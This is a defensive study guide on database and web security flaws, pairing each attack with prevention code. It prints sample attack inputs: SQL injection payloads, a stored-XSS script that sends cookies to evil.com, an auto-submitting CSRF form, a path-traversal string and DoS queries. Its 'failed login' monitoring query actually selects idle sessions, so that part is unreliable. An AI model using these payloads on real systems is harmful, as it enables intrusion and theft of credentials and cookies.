# Security Vulnerabilities in Databases

## Table of Contents
1. [SQL Injection Attacks](#sql-injection-attacks)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
4. [File Upload Vulnerabilities](#file-upload-vulnerabilities)
5. [Man-in-the-Middle (MITM)](#man-in-the-middle-mitm)
6. [Denial of Service (DoS)](#denial-of-service-dos)
7. [Password Cracking](#password-cracking-techniques)

---

## SQL Injection Attacks

### Definition
SQL Injection is a code injection technique where malicious SQL statements are inserted into application queries through user input.

### Vulnerable Code Example
```csharp
// VULNERABLE - String concatenation
string userId = Request.Form["UserID"];
string query = "SELECT * FROM Users WHERE UserID = '" + userId + "'";
// Input: 1' OR '1'='1
// Result: SELECT * FROM Users WHERE UserID = '1' OR '1'='1' -- Returns all users!
```

### Attack Vectors

#### Union-Based Injection
```sql
-- Attacker input:
1' UNION SELECT UserName, Password FROM Users--

-- Resulting query:
SELECT * FROM Products WHERE ProductID = '1' 
UNION SELECT UserName, Password FROM Users--'
-- Returns products AND user credentials
```

#### Boolean-Based Blind Injection
```sql
-- Attacker tests conditions:
1' AND 1=1 -- True, normal page
1' AND 1=2 -- False, different response
-- Used to infer data character by character
```

#### Time-Based Blind Injection
```sql
-- Attacker input causes delay if condition true:
1'; WAITFOR DELAY '00:00:05'--
-- Or: 1' AND IF(ASCII(SUBSTRING(password,1,1))=97, SLEEP(5), 0)--
```

### Prevention Methods

#### 1. Parameterized Queries (Prepared Statements)
```csharp
// SAFE - Parameterized
string query = "SELECT * FROM Users WHERE UserID = @UserID";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@UserID", userId);

// User input is treated as literal value, never executed
// Input: 1' OR '1'='1 becomes literal string value
```

#### 2. Stored Procedures
```sql
-- Create parameterized procedure
CREATE PROCEDURE GetUserByID @UserID INT
AS
BEGIN
    SELECT * FROM Users WHERE UserID = @UserID;
END;

-- Application calls:
EXEC GetUserByID @UserID = @InputValue;
```

#### 3. Input Validation
```csharp
// Whitelist validation
if (!int.TryParse(userId, out int validId))
{
    throw new ArgumentException("Invalid UserID");
}

// OR regex validation
if (!Regex.IsMatch(userId, @"^\d+$"))
{
    throw new ArgumentException("Invalid input");
}
```

#### 4. ORM Frameworks
```csharp
// Entity Framework (parameterized by default)
var users = context.Users
    .Where(u => u.UserID == userId)
    .ToList();

// Dapper (parameterized)
var users = connection.Query<User>(
    "SELECT * FROM Users WHERE UserID = @UserID",
    new { UserID = userId });
```

### Defense in Depth
1. **Least privilege**: Application DB user has minimal permissions
2. **No dynamic SQL**: Avoid `EXEC` with concatenated strings
3. **WAF**: Web Application Firewall for pattern detection
4. **Logging**: Log and alert on suspicious patterns

---

## Cross-Site Scripting (XSS)

### Definition
XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of XSS

#### Stored XSS (Persistent)
```sql
-- Attacker submits malicious comment:
"<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"

-- Stored in database, executed for every viewer
```

#### Reflected XSS
```html
<!-- URL parameter reflected in page without sanitization -->
https://site.com/search?q=<script>alert('xss')</script>
```

#### DOM-Based XSS
```javascript
// JavaScript writes user input to DOM unsafely
document.write("<div>" + location.hash.slice(1) + "</div>");
```

### Database-Related XSS
```sql
-- Never trust data from database
-- Sanitize before display even if stored by authenticated users

-- Vulnerable stored procedure
CREATE PROCEDURE GetUserProfile @UserID INT
AS
BEGIN
    SELECT Bio FROM Users WHERE UserID = @UserID;
    -- Bio could contain: <script>malicious code</script>
END;
```

### Prevention

#### Output Encoding
```csharp
// Encode before rendering
string bio = user.Bio;
string safeBio = HttpUtility.HtmlEncode(bio);
// <script> becomes &lt;script&gt;
```

#### Content Security Policy
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
```

---

## Cross-Site Request Forgery (CSRF)

### Definition
Attack that tricks users into performing unwanted actions on authenticated websites.

### How It Works
```html
<!-- Attacker's site has this form -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### Database Impact
- Unauthorized data modifications
- Privilege escalations
- Data exfiltration via audit logs

### Prevention

#### Anti-CSRF Tokens
```csharp
// Server generates token
string csrfToken = GenerateSecureToken();
Session["CSRFToken"] = csrfToken;

// Include in forms
<input type="hidden" name="csrf_token" value="@csrfToken" />

// Validate on POST
if (Request.Form["csrf_token"] != Session["CSRFToken"])
{
    throw new SecurityException("Invalid CSRF token");
}
```

#### SameSite Cookies
```http
Set-Cookie: session_id=abc123; SameSite=Strict
```

---

## File Upload Vulnerabilities

### Common Attacks
- Upload executable files (PHP, ASP, JSP)
- Path traversal (`../../../etc/passwd`)
- MIME type spoofing
- Large file DoS

### Database Storage Considerations
```sql
-- Store metadata, not file content
CREATE TABLE FileUploads (
    FileID INT PRIMARY KEY,
    OriginalName NVARCHAR(255),  -- Sanitize!
    StoredName NVARCHAR(255),    -- GUID-based
    FileType NVARCHAR(50),       -- Whitelist only
    FileSize BIGINT,
    UploadDate DATETIME,
    MimeType NVARCHAR(100),      -- Verified, not trusted
    StoredPath NVARCHAR(500)     -- Outside web root
);
```

### Best Practices
1. **Validate file types** by content, not extension
2. **Store outside web root** with PHP execution disabled
3. **Generate new filenames** (GUIDs)
4. **Scan with antivirus** before storage
5. **Limit file sizes** at application and web server levels

---

## Man-in-the-Middle (MITM)

### Definition
Attack where adversary intercepts and potentially alters communication between two parties.

### Database Connection Security
```sql
-- Enforce encrypted connections
-- Connection string:
Server=myServer;Database=myDB;Encrypt=True;TrustServerCertificate=False;

-- Require TLS 1.2+
```

### Prevention
1. **TLS/SSL encryption** for all connections
2. **Certificate pinning** in applications
3. **Verify server certificates** (don't ignore warnings)
4. **Use VPNs** for remote database access

---

## Denial of Service (DoS)

### Database-Specific DoS Vectors

#### Resource Exhaustion
```sql
-- Attacker submits:
SELECT * FROM HugeTable CROSS JOIN HugeTable2;
-- Consumes all memory and CPU
```

#### Lock Contention
```sql
-- Attacker begins but never commits:
BEGIN TRANSACTION;
UPDATE CriticalTable SET Status = 'Locked';
-- Holds locks indefinitely
```

#### Query Flooding
```sql
-- Rapid application submits thousands of expensive queries
-- No caching or rate limiting
```

### Prevention

#### Query Timeouts
```sql
-- Application level
cmd.CommandTimeout = 30; // seconds

-- SQL Server level
SET QUERY_GOVERNOR_COST_LIMIT 300; -- Prevents expensive queries
```

#### Resource Governor
```sql
-- Limit resource usage by workload
CREATE WORKLOAD GROUP LowPriority
WITH (
    REQUEST_MAX_MEMORY_GRANT_PERCENT = 5,
    MAX_DOP = 1,
    REQUEST_MAX_CPU_TIME_SEC = 10
);
```

#### Rate Limiting
```csharp
// Application-level throttling
if (rateLimiter.IsAllowed(clientIP, maxRequests: 100, window: TimeSpan.FromMinutes(1)))
{
    ExecuteQuery();
}
```

#### Connection Pooling Limits
```xml
<connectionStrings>
    <add name="MyDB" 
         connectionString="...;Max Pool Size=100;Connection Timeout=30;" />
</connectionStrings>
```

---

## Password Cracking Techniques

### Common Attacks

#### Brute Force
Trying every possible combination:
- **Time**: Exponential with password length
- **Countermeasure**: Account lockout, rate limiting

#### Dictionary Attack
Trying common passwords and dictionary words:
- **Wordlists**: rockyou.txt, common passwords
- **Countermeasure**: Strong password policies

#### Rainbow Tables
Precomputed hash tables for reversing hashes:
- **Countermeasure**: Salting (unique per password)

### Secure Password Storage
```sql
-- NEVER store plain text passwords
-- Use bcrypt, Argon2, or PBKDF2

-- Example bcrypt hash:
$2a$12$R9h/cIPz0gi.URNNX3kh2S1Y8xc 
\____/\_\_________________________/
Alg Cost      Salt + Hash
```

### Database Security Best Practices

| Practice | Implementation |
|----------|----------------|
| **Hash with salt** | bcrypt, Argon2, scrypt |
| **Minimum length** | 12+ characters |
| **Complexity rules** | Upper, lower, digits, symbols |
| **Rate limiting** | Lock after 5 failed attempts |
| **Password history** | Prevent reuse of last 12 passwords |

### Monitoring for Attacks
```sql
-- Failed login attempts
SELECT 
    login_time,
    program_name,
    client_net_address
FROM sys.dm_exec_sessions s
JOIN sys.dm_exec_connections c ON s.session_id = c.session_id
WHERE s.status = 'sleeping'
  AND last_request_start_time < DATEADD(minute, -5, GETDATE());
```

---

## Security Checklist

### Application Layer
- [ ] Parameterized queries only
- [ ] Output encoding for all dynamic content
- [ ] CSRF tokens on state-changing operations
- [ ] Input validation (whitelist approach)
- [ ] Secure session management

### Database Layer
- [ ] Principle of least privilege
- [ ] Encrypted connections (TLS)
- [ ] Audit logging enabled
- [ ] Strong password hashing
- [ ] Regular security patches

### Infrastructure Layer
- [ ] Database firewall rules
- [ ] Network segmentation
- [ ] Intrusion detection
- [ ] Backup encryption
- [ ] Monitoring and alerting

---

*Source: OWASP guidelines, database security best practices, and secure application development standards.*
